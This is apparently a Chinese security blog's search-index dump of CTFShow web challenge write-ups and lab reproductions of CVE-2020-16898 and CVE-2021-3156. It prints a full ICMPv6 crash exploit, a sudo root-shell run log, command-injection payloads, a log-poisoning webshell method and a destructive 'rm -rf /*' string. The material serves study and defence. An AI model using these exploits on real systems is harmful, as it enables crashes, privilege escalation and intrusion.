空格绕过\nweb46 过滤了数子，$，*等，通配符可以使用？问号，空格可用%09\npayload: ?c=sort%09fl?g.php||\nweb47 又过滤了些别的。\npayload: ?c=tac%09fl?g.php||\n","date":"2021-04-14T00:00:00Z","permalink":"https://lunaasuka.github.io/p/ctfshow-web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cwp/","title":"CTFShow web入门命令执行wp"},{"content":"简简单单 web1源码泄露 直接f12就能看到。\nweb2绕过前台JS 由于js限制该网页不能直接查看源码，可以考虑禁用js，或者直接Ctrl+U，或者 view-source:http://网站/\nweb3协议头信息泄露 响应头里存了flag，直接burp抓包查看，或者f12用network查看。\nweb4后台robots泄露 访问robots.txt，可以找到有一个/flagishere.txt目录，直接访问得到flag。\nweb5 PHPS源码泄露 直接访问 index.phps，得到源码，就能看到flag。\nweb6源码压缩包泄露 有提示，所以可以直接访问，网站后面加www.zip。没有提示的情况下可以直接用扫描器扫出来。\n解压得到文件，提示flag在fl000g.txt里，直接网页访问即可。\nweb7版本控制泄露源码 实际上就是git泄露，可以通过扫描得到。之后可以直接访问或者使用githack这样的工具。\nweb8版本控制泄露2 实际上是svn泄露，同理git。也有相关工具可供使用，github自寻。\nweb9 vim临时文件泄露 程序员使用vim编辑器编写一个index.php文件时，会有一个.index.php.swp文件，如果文件正常退出，则该文件被删除，如果异常退出，该文件则会保存下来，该文件可以用来恢复异常退出的index.php，同时多次意外退出并不会覆盖旧的.swp文件，而是会生成一个新的，例如.swo文件。\n做法同上，直接访问即可。\nweb10 cookie泄露 直接查看cookie即可。\nweb11域名记录泄露 http://www.jsons.cn/nslookup/在这个网站里直接查询ctfshow.com即可。\n关于域名解析类型\nweb12敏感信息泄露 首先扫目录，可以发现有登录口，访问需要账号密码，账号很明显是admin，密码未知，在整个网站内进行搜寻，可以发现页面最下方有一行数字，即为密码，登录拿到flag。web13内部技术文档泄露 网页最下方有个document可以点进去，该文件翻到最后可以找到后台地址和账号密码，登录即可。\nweb14编辑器配置不当 根据提示，访问editor界面，这里面有上传功能，可以在这里访问目标服务器的内部文件，找到flag即可。\nweb15密码逻辑脆弱 扫目录，登录后台，用户名admin，忘记密码，密保答案是西安，至于为啥是西安，你可以找到一个qq群号，这个群显示所在地点是西安。。。然后登录即可。\nweb16探针泄露 说了是探针泄露，那就直接访问tz.php，搜索flag即可。\nphp探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针。\nweb17CDN穿透 通过使用各类解析网站或者ping之类的工具得到目标网站的ip即可。\nweb18 js敏感信息泄露 根据题目，找js文件，里面有条判断，是当分数达到100以上时触发的\n1 2 3 4  if(score\u0026gt;100) { var result=window.confirm(\u0026#34;\\u4f60\\u8d62\\u4e86\\uff0c\\u53bb\\u5e7a\\u5e7a\\u96f6\\u70b9\\u76ae\\u7231\\u5403\\u76ae\\u770b\\u770b\u0026#34;); }   这串Unicode转换成中文就能得到线索。\nweb19前段密钥泄露 查看源码，找到了处理后的密码，抓包改密码即可。\nweb20数据库恶意下载 mdb文件是早期asp+access构架的数据库文件，直接查看url路径添加/db/db.mdb，下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag 。\n","date":"2021-04-08T00:00:00Z","permalink":"https://lunaasuka.github.io/p/ctfshow-web%E5%85%A5%E9%97%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86wp/","title":"CTFShow web入门信息收集wp"},{"content":"内含EXP 漏洞概述 ​\t远程攻击者通过构造特制的ICMPv6 Router Advertisement（路由通告）数据包，并将其发送到远程Windows主机上，即可在目标主机上执行任意代码。要利用此漏洞，攻击者必须将特制的ICMPv6路由器广告数据包发送到远程Windows计算机。\n影响范围   Windows 10 Version 1709 for 32-bit Systems\n  Windows 10 Version 1709 for ARM64-based Systems\n  Windows 10 Version 1709 for x64-based Systems\n  Windows 10 Version 1803 for 32-bit Systems\n  Windows 10 Version 1803 for ARM64-based Systems\n  Windows 10 Version 1803 for x64-based Systems\n  Windows 10 Version 1809 for 32-bit Systems\n  Windows 10 Version 1809 for ARM64-based Systems\n  Windows 10 Version 1809 for x64-based Systems\n  Windows 10 Version 1903 for 32-bit Systems\n  Windows 10 Version 1903 for ARM64-based Systems\n  Windows 10 Version 1903 for x64-based Systems\n  Windows 10 Version 1909 for 32-bit Systems\n  Windows 10 Version 1909 for ARM64-based Systems\n  Windows 10 Version 1909 for x64-based Systems\n  Windows 10 Version 2004 for 32-bit Systems\n  Windows 10 Version 2004 for ARM64-based Systems\n  Windows 10 Version 2004 for x64-based Systems\n  Windows Server 2019\n  Windows Server 2019 (Server Core installation)\n  Windows Server, version 1903 (Server Core installation)\n  Windows Server, version 1909 (Server Core installation)\n  Windows Server, version 2004 (Server Core installation)\n  环境搭建 攻击机：kali2019\n​\tpython版本3.7.4，已安装scapy包。\n靶机：win10 2004版本\n首先我们要在虚拟机中nat一个子网出来，打开VMware，选择左上角编辑→虚拟网络编辑器，打开后点击下方的“更改设置”。然后进入NAT设置中选择启用IPV6，应用设置即可。\n这边开启之后去把win10的ipv6打开，进入网络和internet设置，查看虚拟网卡的属性。勾选IPV6即可。\n漏洞复现 EXP下载地址： http://site.pi3.com.pl/exp/p_CVE-2020-16898.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  #!/usr/bin/env python3 # # Proof-of-Concept / BSOD exploit for CVE-2020-16898 - Windows TCP/IP Remote Code Execution Vulnerability # # Author: Adam \u0026#39;pi3\u0026#39; Zabrocki # http://pi3.com.pl # from scapy.all import * v6_dst = \u0026#34;fd12:db80:b052:0:7ca6:e06e:acc1:481b\u0026#34; //这里替换成靶机的ipv6地址或临时ipv6地址 v6_src = \u0026#34;fe80::24f5:a2ff:fe30:8890\u0026#34;//这里替换成攻击机的本地链接ipv6地址(win)或者最短的那个ipv6地址(linux) p_test_half = \u0026#39;A\u0026#39;.encode()*8 + b\u0026#34;\\x18\\x30\u0026#34; + b\u0026#34;\\xFF\\x18\u0026#34; p_test = p_test_half + \u0026#39;A\u0026#39;.encode()*4 c = ICMPv6NDOptEFA(); e = ICMPv6NDOptRDNSS() e.len = 21 e.dns = [ \u0026#34;AAAA:AAAA:AAAA:AAAA:FFFF:AAAA:AAAA:AAAA\u0026#34;, \u0026#34;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA\u0026#34;, \u0026#34;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA\u0026#34;, \u0026#34;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA\u0026#34;, \u0026#34;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA\u0026#34;, \u0026#34;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA\u0026#34;, \u0026#34;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA\u0026#34;, \u0026#34;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA\u0026#34;, \u0026#34;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA\u0026#34;, \u0026#34;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA\u0026#34; ] pkt = ICMPv6ND_RA() / ICMPv6NDOptRDNSS(len=8) / \\ Raw(load=\u0026#39;A\u0026#39;.encode()*16*2 + p_test_half + b\u0026#34;\\x18\\xa0\u0026#34;*6) / c / e / c / e / c / e / c / e / c / e / e / e / e / e / e / e p_test_frag = IPv6(dst=v6_dst, src=v6_src, hlim=255)/ \\ IPv6ExtHdrFragment()/pkt l=fragment6(p_test_frag, 200) for p in l: send(p)   配置好后执行exp即可。\n1  python3 CVE-2020-16898.py   修复方式 1.升级windows版本，下载对应补丁包进行修复。\n​\t下载链接：https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898\n2.禁用基于RA的DNS配置CMPv6 RDNSS\n​\t使用以下PowerShell命令禁用ICMPv6 RDNSS，以防止攻击者利用此漏洞。此解决方法仅适用于Windows 1709及更高版本。\n1  netsh int ipv6 set int *INTERFACENUMBER* rabaseddnsconfig=disable   参考链接 https://www.secpulse.com/archives/145622.html\nhttps://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898\nhttps://www.cnblogs.com/forforever/p/13846077.html\n","date":"2021-03-03T00:00:00Z","permalink":"https://lunaasuka.github.io/p/cve-2020-16898%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","title":"CVE-2020-16898漏洞复现"},{"content":"题目描述：特定函数绕过。\n根据描述来看我们需要绕过一些函数，这里有两个重要函数，一个是parse_url，一个是shell_exec。第二个大家应该都很熟悉，这里说一下第一个。\n该函数是用来解析url的，一个完整的url会包括好多部分，以下是示例。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  \u0026lt;?php $url = \u0026#39;http://username:password@hostname/path?arg=value#anchor\u0026#39;; print_r(parse_url($url)); ?\u0026gt;输出： Array ( [scheme] =\u0026gt; http [host] =\u0026gt; hostname [user] =\u0026gt; username [pass] =\u0026gt; password [path] =\u0026gt; /path [query] =\u0026gt; arg=value [fragment] =\u0026gt; anchor )   好我们返回来看题，题目代码解析url之后使用了其host和path两部分。我们可以直接修改上面代码中的示例url的对应部分，这里大家可以自己用php实际测试一下。\n以下是我本人的做题思路，想要payload的同学可以直接跳到后面。\n我的思路： 最开始我的着重点不在于给出的shell_exec这个函数中的格式，也就是“echo”那一串，而是把目光放在了parse_url上，我发现可以在path这个地方进行任意命令执行，大家可以用下面的代码实测一下，我将其命名为test.php\n1 2 3 4 5 6 7 8 9 10  \u0026lt;?php error_reporting(0); if(isset($_GET[\u0026#39;url\u0026#39;])){ $url = parse_url($_GET[\u0026#39;url\u0026#39;]); var_dump($url) $a=shell_exec(\u0026#39;echo \u0026#39;.$url[\u0026#39;host\u0026#39;].\u0026#39;\u0026gt; \u0026#39;.$url[\u0026#39;path\u0026#39;]); echo $a; }else{ highlight_file(__FILE__); }   我们可以尝试构造url=http://username:password@hostname//|ls\n大家可以发现我将path替换成了 //|ls ，可以看到我多加了一个斜杠，这里涉及到parse_url函数的绕过，这样做会使函数解析失效，请大家自行百度，不做过多讲解。然后通过管道符拼接我们想要的命令就可以实现任意命令执行。\n但是有个很严重的问题是shell_exec这个函数没有回显，虽然我们自己本地测试可以用变量承载它的输出，但是这道题不行，我当时在这里卡了好久，一直想通过一些文件操作命令写入或者编辑，但是我们权限不够，或者说这个页面的php文件权限不够，大家可以试着将本地的test.php文件提升权限，当权限足够高的时候就可以随意操作文件了。\n这条路终究是走不通的，也可能是我没想到，如果有人有更好的解题办法请联系我！那只能转向shell_exec了，可以看到，它已经给了一串字符了，再一看它是规定好了要使用echo这个命令，后面还有个\u0026gt;符号，百度一查发现是echo的重定向功能，这么一看，这道题的实际意思其实是让我们将url中的【host】部分重定向到【path】中。在linux命令行中使用这个命令，例如 echo flag.php \u0026gt; a.txt ，这样的话如果有a.txt则将\u0026quot;flag.php\u0026quot;这个字符串覆盖到a.txt中，若是没有a.txt的话则新建一个然后覆盖写入。\n本题没说flag在哪个文件里。所以我们要先执行ls。\n那咋即执行命令，又把命令的输出写入文件呢？\npayload： 这里我们构造payload：?url=http://username:password@`ls`/var/www/html/a.txt\n答案是反引号，反引号也会执行命令，然后echo将ls的输出写入到a.txt中，之后直接访问a.txt会发现有个fl0g.php的文件\n然后再次构造：?url=http://username:password@`cat fl0g.php`/var/www/html/a.txt\n访问a.txt获得flag。\nweb397 跟web396差不多，不同的是重定向到了/tmp文件夹，但是没有关系\n直接构造payload：?url=http://username:password@`cat fl0g.php`/../../../var/www/html/a.txt\nls那个大家自己构造，flag所在文件名没变就直接拿过来用了。\nweb398 我感觉我做的是非预期解\u0026hellip;\u0026hellip;\npayload同web397。其实这题过滤的是【host】中的分号，不是很懂预期解应该是什么。\nweb399 同上，之前看群里大佬疯狂秒题之后说用的一个payload，现在算是见识到了。\nweb400 同上。\nweb401 同上。\nweb402 过滤了schema，把http改掉就行，其余同上。\n","date":"2021-02-07T00:00:00Z","permalink":"https://lunaasuka.github.io/p/ctfshow-web%E5%85%A5%E9%97%A8396-402wp/","title":"CTFShow web入门396-402wp"},{"content":"这道题很简洁，这里用了一个copy()函数，一开始我一直纠结在这个函数本身的性质上，翻来覆去的研究半天也看不出个所以然，这个函数的第二个参数是目标文件，如果目标文件存在则直接覆盖，但是如果不存在则会新建一个文件，这是重点，但文档上没有说明，这样就可以构造payload：?u=/var/log/nginx/access,log\u0026amp;p=a\n然后直接访问a.php，你会看到copy过来的日志文件，然后就可以改UA头然后通过日志getshell，但是不要忘了，copy过来的a.php并不会产生后续变化，也就是说，你需要先改UA头注入一个，然后再去copy日志，鉴于这里已经copy过一次了，所以我们修改完UA并且发包后，重新copy一个到b.php,即?u=/var/log/nginx/access,log\u0026amp;p=b，然后利用蚁剑连上这个b.php，就可以浏览flag.php了。\n","date":"2021-02-06T00:00:00Z","permalink":"https://lunaasuka.github.io/p/ctfshow-web%E5%85%A5%E9%97%A8459wp/","title":"CTFShow web入门459wp"},{"content":"漏洞概述 1月26日，Sudo发布安全通告，修复了一个类Unix操作系统在命令参数中转义反斜杠时存在基于堆的缓冲区溢出漏洞。当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或-i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。只要存在sudoers文件（通常是/etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。请受影响的用户尽快采取措施进行防护。\n影响范围  sudo 1.8.2 - 1.8.31p2 sudo 1.9.0 - 1.9.5p1  漏洞检测   首先查看sudo版本号 sudo --version\n  执行sudoedit -s /命令\n 若出现以“ sudoedit: ”开头的错误，则可能存在该漏洞。     若出现以“ usage ”开头的错误，则无该漏洞。  复现过程 首先创建一个非root权限用户，然后下载POC。\n1 2 3 4 5 6 7 8 9 10 11 12 13  test@kali:/home$ cd test-1/ test@kali:~$ ls CVE-2021-3156_nss_poc_ubuntu.tar.gz test@kali:~$ tar -zxvf CVE-2021-3156_nss_poc_ubuntu.tar.gz CVE-2021-3156/ CVE-2021-3156/hax.c CVE-2021-3156/lib.c CVE-2021-3156/Makefile test@kali:~$ ls CVE-2021-3156 CVE-2021-3156_nss_poc_ubuntu.tar.gz test@kali:~$ cd CVE-2021-3156/ test@kali:~/CVE-2021-3156$ ls hax.c lib.c Makefile   按照上面的步骤将下载下来的压缩包解压，然后进入文件夹编译程序。\n1 2 3 4 5 6 7  test@kali:~/CVE-2021-3156$ make rm -rf libnss_X mkdir libnss_X gcc -o sudo-hax-me-a-sandwich hax.c gcc -fPIC -shared -o \u0026#39;libnss_X/P0P_SH3LLZ_ .so.2\u0026#39; lib.c test@kali:~/CVE-2021-3156$ ls hax.c lib.c libnss_X Makefile sudo-hax-me-a-sandwich   编译好程序之后，执行sudo-hax-me-a-sandwich\n1 2 3 4 5 6 7 8 9 10 11  test@kali:~/CVE-2021-3156$ ./sudo-hax-me-a-sandwich 0 ** CVE-2021-3156 PoC by blasty \u0026lt;peter@haxx.in\u0026gt; using target: \u0026#39;Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31\u0026#39; ** pray for your rootshell.. ** [+] bl1ng bl1ng! We got it! # whoami root # id uid=0(root) gid=0(root) groups=0(root),1000(test)   1 2 3 4 5 6 7 8 9 10 11  test@kali:~/CVE-2021-3156$ ./sudo-hax-me-a-sandwich 1 ** CVE-2021-3156 PoC by blasty \u0026lt;peter@haxx.in\u0026gt; using target: \u0026#39;Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28\u0026#39; ** pray for your rootshell.. ** [+] bl1ng bl1ng! We got it! # whoami root # id uid=0(root) gid=0(root) groups=0(root),1000(test)   可选参数貌似是0和1，不管使用哪个都能提权，显示的结果稍有不同，感兴趣的同学可以自行研究。\n修补方法 将sudo升级到安全版本\nhttps://www.sudo.ws/download.html\n临时修补方法 对于无法立即更新的用户，建议使用systemtap进行以下临时缓解：\n  安装所需的systemtap软件包和依赖项：\nsystemtap yum-utils kernel-devel-\u0026quot;$(uname -r)\u0026quot;\n对于RHEL 7，使用命令安装 kernel debuginfo：debuginfo-install -y kernel-\u0026quot;$(uname -r)\u0026quot;。 对于RHEL 8，使用命令安装 sudo debuginfo：debuginfo-install sudo。\n  创建以下systemtap脚本（将文件命名为sudoedit-block.stap）: probe process(\u0026quot;/usr/bin/sudo\u0026quot;).function(\u0026ldquo;main\u0026rdquo;) { command = cmdline_args(0,0,\u0026quot;\u0026quot;); if (strpos(command, \u0026ldquo;edit\u0026rdquo;) \u0026gt;= 0) { raise(9); } }\n  使用以下命令安装脚本：（使用root权限） #nohup stap -g sudoedit-block.stap \u0026amp; 该脚本将使得易受攻击的sudoedit二进制文件停止工作。sudo命令仍将照常工作。上述更改在重启后失效，必须在每次重启后重新应用。\n  一旦安装了补丁程序，就可以通过取消systemtap进程来删除systemtap脚本。例如，通过使用： #kill -s SIGTERM 7590 (其中7590是systemtap进程的PID)\n  参考链接：https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit\nEXP地址：https://github.com/stong/CVE-2021-3156\nPOC的github地址：https://github.com/blasty/CVE-2021-3156\n","date":"2021-02-02T00:00:00Z","permalink":"https://lunaasuka.github.io/p/cve-2021-3156%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","title":"CVE-2021-3156漏洞复现"},{"content":"web1-7 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;ctf.show萌新计划web1\u0026lt;/title\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;?php # 包含数据库连接文件 include(\u0026#34;config.php\u0026#34;); # 判断get提交的参数id是否存在 if(isset($_GET[\u0026#39;id\u0026#39;])){ $id = $_GET[\u0026#39;id\u0026#39;]; # 判断id的值是否大于999 if(intval($id) \u0026gt; 999){ # id 大于 999 直接退出并返回错误 die(\u0026#34;id error\u0026#34;); }else{ # id 小于 999 拼接sql语句 $sql = \u0026#34;select * from article where id = $id order by id limit 1 \u0026#34;; echo \u0026#34;执行的sql为：$sql\u0026lt;br\u0026gt;\u0026#34;; # 执行sql 语句 $result = $conn-\u0026gt;query($sql); # 判断有没有查询结果 if ($result-\u0026gt;num_rows \u0026gt; 0) { # 如果有结果，获取结果对象的值$row while($row = $result-\u0026gt;fetch_assoc()) { echo \u0026#34;id: \u0026#34; . $row[\u0026#34;id\u0026#34;]. \u0026#34; - title: \u0026#34; . $row[\u0026#34;title\u0026#34;]. \u0026#34; \u0026lt;br\u0026gt;\u0026lt;hr\u0026gt;\u0026#34; . $row[\u0026#34;content\u0026#34;]. \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } } # 关闭数据库连接 $conn-\u0026gt;close(); } }else{ highlight_file(__FILE__); } ?\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;!-- flag in id = 1000 --\u0026gt; \u0026lt;/html\u0026gt;   快速浏览一下，需要get一个id并且值为1000，需要绕过的点是intval()函数。\n我们来看一下php Manual的实例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  \u0026lt;?php echo intval(42); // 42 echo intval(4.2); // 4 echo intval(\u0026#39;42\u0026#39;); // 42 echo intval(\u0026#39;+42\u0026#39;); // 42 echo intval(\u0026#39;-42\u0026#39;); // -42 echo intval(042); // 34 echo intval(\u0026#39;042\u0026#39;); // 42 echo intval(1e10); // 1410065408 echo intval(\u0026#39;1e10\u0026#39;); // 1 echo intval(0x1A); // 26 echo intval(42000000); // 42000000 echo intval(420000000000000000000); // 0 echo intval(\u0026#39;420000000000000000000\u0026#39;); // 2147483647 echo intval(42, 8); // 42 echo intval(\u0026#39;42\u0026#39;, 8); // 34 echo intval(array()); // 0 echo intval(array(\u0026#39;foo\u0026#39;, \u0026#39;bar\u0026#39;)); // 1 echo intval(false); // 0 echo intval(true); // 1 ?\u0026gt;  这里利用了intval漏洞，我们可以传入一个字符串'1000'，这样就可以绕过了。除此之外要注意，输入的id最后是要拼接到sql语句上的，不过在MySQL中1000与'1000\u0026rsquo;或者\u0026quot;1000\u0026quot;是等价的。\n其他解：\n​\t这里可以使用多种位运算符来绕过\n 125\u0026lt;\u0026lt;3，利用左移运算符，经过计算后可以得到1000，并且在数据库中可以运行 680|320，992|8等，利用或运算符，经过计算可以得到1000，并且一样可以在数据库中使用 0b1111101000 ，使用二进制绕过，同上 0x3e8，这是使用16进制绕过，同上 992^8，144^888，200^800等，利用异或运算符，同上 ~~1000，利用取反，两次取反即可绕过，同上 加减乘除运算符大家都可以自行尝试，这里就不过多赘述了  以上这些都是绕过intval的方法，后面几道题都是在web1的前提上加了正则过滤，大家请自行判断以上解中哪些可以使用。\n另外除了这些还有其他各种非预期解，可以从sql的角度出发去考虑，例如id=id \u0026ndash; 等，有兴趣的可以自行研究。\nweb8 这题算是一道梗题，仔细观察web1-8的题目描述可以看出是阿呆对抗黑客入侵的血泪史，在被一次次渗透之后，老板终于将阿呆辞退，于是就有了web8以及web8的描述“ 阿呆熟悉的一顿操作，去了埃塞尔比亚。 ”\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;ctf.show萌新计划web1\u0026lt;/title\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;?php # 包含数据库连接文件,key flag 也在里面定义 include(\u0026#34;config.php\u0026#34;); # 判断get提交的参数id是否存在 if(isset($_GET[\u0026#39;flag\u0026#39;])){ if(isset($_GET[\u0026#39;flag\u0026#39;])){ $f = $_GET[\u0026#39;flag\u0026#39;]; if($key===$f){ echo $flag; } } }else{ highlight_file(__FILE__); } ?\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   说道程序员跑路，自然少不了经典操作删库，于是flag即为 rm -rf /*\npayload：?flag= rm -rf /*\n经 典 永 流 传\n","date":"2021-01-31T00:00:00Z","permalink":"https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web1-8/","title":"CTFShow萌新计划web1-8"},{"content":"web9 题目描述： 阿呆在埃塞俄比亚终于找了一个网管的工作，闲暇时还能种点菜。\n逻辑十分简单，get一个c，必须要能匹配到system或者exec或者highlight，然后执行命令，提示flag在config.php中，那就直接构造?c=system(\u0026lsquo;cat config.php\u0026rsquo;);得到flag。\n注：这里要说的是，system函数在执行命令的时候是有回显的，而exec是没有回显的，这点要注意。\nweb10 题目描述： 阿呆看见对面二黑急冲冲的跑过来，告诉阿呆出大事了，阿呆问什么事，二黑说：这几天天旱，你菜死了！\n代码几乎没有变化，只是在正则匹配前面加了个!，意思也很明显，当c中没有这几个单词时才能执行命令。\n这时我们需要其他命令执行函数，这里我们可以使用passthru函数，构造payload：?c=passthru(\u0026lsquo;cat config.php\u0026rsquo;);\n然后查看源码得到flag。\n这里也可以使用变量拼接，payload： ?c=$a=\u0026lsquo;sys\u0026rsquo;;$b=\u0026lsquo;tem\u0026rsquo;;$d=$a.$b;$d(\u0026lsquo;cat config.php\u0026rsquo;);\n同样可以得到flag。\n以下是一些命令执行函数：\n system() passthru() exec() shell_exec() popen() proc_open() pcntl_exec() ``反引号，在linux中反引号的作用就是将反引号内的Linux命令先执行，然后将执行结果赋予变量。  web11 题目描述： 阿呆听完自己菜死了，自己呆了。决定修好漏洞，绝对不能让自己再菜死了。\n这次多过滤了一个cat，但是并没有起到什么作用，因为能够查看文件的命令有很多种，以下是常用的命令：\n tac：从最后一行开始显示，反向cat more：一页一页显示内容 less：类似more head：查看头几行 tail：查看尾几行 nl：显示内容，并且输出行号 od：以二进制方式显示内容 vi/vim：用编辑器查看 sort：显示内容 uniq：显示内容 grep： 在当前目录中，查找后缀有 php 字样的文件中包含 flag 字符串的文件，并打印出该字符串这行。例如：grep flag *php  构造payload：?c=passthru(\u0026lsquo;tac config.php\u0026rsquo;);\nweb12 题目描述： 阿呆不慌不忙的拔掉自己所有的菜，以后自己就不会菜死了。\n好家伙把整个config.php给过滤了是吧。但是对我们构不成威胁。\n在这里我们可以利用通配符来解决问题，只要给出开头，通配符就会自动匹配所需内容。\n构造payload：?c=passthru(\u0026lsquo;tac con*');\n*可以用来匹配多个字符，在linux中?也可用来匹配单个字符，所以也可以用?c=passthru(\u0026lsquo;tac confi?????');这里五个?正好匹配了g.php，肥肠的方便，肥肠的好用。\nc=$a = base64_decode(\u0026lsquo;c3lzdGVt\u0026rsquo;);$b=base64_decode(\u0026lsquo;Y2F0IGNvbmZpZy5waHA=');$a($b); 拼接法依然好用，这里用了base64的转换，可以直接绕过。\n这里也可以使用grep，grep的优点在于可以一次输出多个文件，该题目文件夹下有index.php和config.php两个文件，使用?c=passthru(\u0026lsquo;grep flag *hp\u0026rsquo;);可以一次将两个文件下带有flag的字符串全部输出（动态flag，不要直接输入）\nweb13 题目描述： 阿呆彻底呆了，阿呆拿起谷姐搜索好久，终于找到更狠的方法。 其实只是多过滤一个分号而已。但如若不加分号命令便无法执行，自然无法拿到flag。\n那这里该怎么办呢？我们可以看到这是个php页面，而php语言是必须要用来包括的，在?\u0026gt;之外的东西不会被解析，那么我们可以尝试将 \u0026lsquo;;\u0026rsquo; 转变为 \u0026lsquo;?\u0026gt;\u0026rsquo;\n构造payload：c=passthru(\u0026lsquo;tac con*')?\u0026gt;\n有同学可能会有疑问，因为即使闭合了\u0026lt;?php，但是这条语句依然没有分号，为什么这次可以运行。因为在php中，分号不是必须的，大家可以自行测试，很多语句不需分号依然可以执行，具体细则请大家自行查阅。\nweb14 题目描述： 阿呆忍无可忍了，告诉自己，如果还被攻，自己就跳下去 。看看又多了什么。这次是多过滤了一个括号。\n那不用括号便是。直接构造payload：?c=echo `tac con*`?\u0026gt; 轻松拿下。\n危 阿呆 危\nweb15 题目描述： 人为什么要活着？难道埃塞俄比亚再无我阿呆容身之处？\n阿呆逐渐熟练，这次通配符什么的都过滤了，看样子是没法直接拿到flag了。\n这次我们构造这样的一个payload：?c=echo `$_POST[asuka]`; 进入该页面，什么都不会显示，我们构造的payload正等着接受post过来的数据呢，所以直接post：asuka=cat config.php ，查看页面源码即可找到flag。\n注：这里若是直接使用hackbar可能会出错，因为hackbar在load URL的时候会将url转码，这是不行的，可以手动修改回去，或者直接使用burpsuit做。\nweb16 题目描述： 阿呆为了自己的梦想(fulage)，决定来一波反向跑路。\n啊，这道题没什么好说的。\npayload：?c=36d\t算是官方群里的梗吧，或者可以自己写个爆破脚本啥的，很麻烦就是了，不做讨论。\nweb17 题目描述： 阿呆终于怀揣自己的梦想来到了故土，凭借着高超的系统垃圾清理(rm -rf /*)技术，很快的阿呆找到了一份程序员工作 。\n这道题考察文件包含，但是过滤了php，我们就不能直接包含带php的文件，也不能使用php://伪协议。\n这道题的考察点是日志文件包含，说来奇怪我的wappalyzer没有检测到任何信息，但是根据以往的经验判断是nginx，所以日志默认位置是/var/log/nginx/access.log，可以直接访问，那我们就可以直接修改UA头我这里嫌麻烦就直接用火狐编辑并重新发包了，在右下角那里可以看到修改的UA头：发送后重新访问日志文件可以看到/var/www/html下有36d.php这个文件，直接访问一片空白，查看源码也什么都没有。尝试getshell，修改UA头， 然后尝试使用菜刀类工具连接，我这里使用的是蚁剑，连上后自然就能找到flag了。\n","date":"2021-01-31T00:00:00Z","permalink":"https://lunaasuka.github.io/p/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92web9-21/","title":"CTFShow萌新计划web9-21"},{"content":"其实一直都有搭个博客啊或者直接用csdn去写点什么，记录些什么的想法。\n但是一直都没有去做，直到今天突然想起来可以用github搭博客，简单查了一下好像也不是很难的样子。说干就干。\n查了查教程，配了下环境基本就可以上线了，折腾完终于可以静下心来写点什么了。\n算是一个开始吧。\n自我介绍一下，本人男，一个某不知名211大二在读学生，目前的学习方向是网络安全，这个博客应该主要是放一些自己学习的东西，漏洞复现啊，CTF的WP啊之类的。\n也没什么了，以上，祝好。\n","date":"2021-01-28T00:00:00Z","permalink":"https://lunaasuka.github.io/p/%E5%86%99%E5%9C%A8%E5%BC%80%E5%A4%B4%E7%9A%84%E8%AF%9D/","title":"写在开头的话"}]